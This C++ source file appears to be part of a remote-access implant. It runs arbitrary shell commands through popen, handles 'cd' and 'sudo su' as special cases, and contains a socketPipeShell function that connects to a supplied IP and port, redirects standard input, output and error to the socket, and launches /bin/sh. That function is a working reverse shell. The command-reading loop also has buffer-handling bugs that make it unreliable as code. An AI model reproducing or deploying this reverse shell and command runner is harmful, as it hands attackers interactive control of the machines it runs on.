#include "shell.h"
#include "analyze.h"

#include <sys/wait.h>

#pragma warning(disable:4996)
using namespace std;

constexpr size_t b1K = 1024;
constexpr size_t b4K = 1024*4;

bool proxy_to_cmd(string args_shell){

    string _args_shell = rJsonQuots(args_shell);

    if (_args_shell.length() > 3){
        // cd
        if (_args_shell.substr(0, 2).find("cd") != string::npos){
            string directory = _args_shell.substr(3, _args_shell.length());
            if (!directory.empty()){
                // irrelevent what return
                chdir(directory.c_str());
                return true;
            }
        } 
        else if (args_shell.find("sudo su") != string::npos){
            return true;
        } 
            
    }

    return false;
}


// this function not return nullptr in fatal error: cstyle string empty or with the error 
char* run_pshell(const char* args_shell, size_t &lout, bool proxy) {
    
    const char* err = "bad process output";
    size_t lerr = strlen(err);
    char* error  = new char[lerr+1];
    strcpy(error, err);
    
    if (proxy){return error;}

    char* output = new char[b4K];
    char* buffer = new char[b4K];

    FILE* pipe = popen(args_shell, "r");
    if (pipe == NULL){
        delete[]buffer;
        delete[]output;
        lout = lerr;
        return error;
    }

    // read
    while (1){
        size_t bRead = fread(buffer, 1, b4K, pipe);
        if (!bRead){break;} 
        if (b4K < lout+bRead){
            char* _xptr = static_cast<char*>(realloc(output, lout+bRead));
            if (_xptr == nullptr){
                break;

            }
            output = _xptr;
        }
        memcpy(output+lout, buffer, bRead);
        lout+=bRead;
    }

    pclose(pipe);

    if (!lout){
        delete[]buffer;
        delete[]output;
        lout = lerr;
        return error;
    }
    // cleanup
    delete[] buffer;
    delete[] error;
    output[lout] = '\0';
    
    return output;
}



void socketPipeShell(const char* ip, unsigned port, const char* _app){
    
    struct sockaddr_in rshell;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    rshell.sin_family = AF_INET;       
    rshell.sin_port = htons(port);
    rshell.sin_addr.s_addr = inet_addr(ip);

    if(connect(sock, (struct sockaddr *) &rshell,sizeof(rshell)) == -1){return;};
    pid_t child_pid = fork();
    // #1: valid?
    if (child_pid < 0){close(sock);return;}
    // #2: SIGNAL
    if (child_pid < 0 || !child_pid){
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    }
    int status;
    waitpid(child_pid, &status, 0);

    
}